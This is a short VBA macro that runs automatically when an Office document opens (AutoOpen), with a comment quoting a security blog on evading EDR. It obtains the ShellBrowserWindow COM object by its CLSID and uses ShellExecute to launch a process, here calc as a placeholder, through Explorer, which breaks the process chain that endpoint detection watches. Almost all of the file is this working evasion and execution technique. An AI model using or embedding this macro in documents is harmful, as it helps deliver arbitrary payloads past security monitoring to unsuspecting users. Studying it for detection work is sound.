Sub AutoOpen()
' https://blog.f-secure.com/dechaining-macros-and-evading-edr/
' The final technique to mention is using COM. COM is a really interesting approach as you can essentially reference any COM object (effectively another executable) from VBScript and use its functions. For example, the object ShellBrowserWindow can be used to execute new processes from Explorer:
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "calc", Null, "C:\Windows\System32", Null, 0

End Sub
